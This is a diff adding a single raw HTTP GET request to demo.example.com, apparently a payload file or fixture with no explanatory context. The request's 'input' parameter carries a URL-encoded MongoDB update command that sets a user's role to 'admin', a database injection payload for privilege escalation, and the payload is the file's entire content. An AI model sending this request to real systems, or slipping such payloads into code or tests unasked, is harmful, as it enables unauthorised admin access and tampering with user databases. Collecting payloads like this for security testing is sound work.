@@ -1,0 +1,4 @@
+GET /a?input=db.users.update%28%7B%22u%22%3A%22x%22%7D%2C%7B%24set%3A%7B%22role%22%3A%22admin%22%7D%7D%29 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
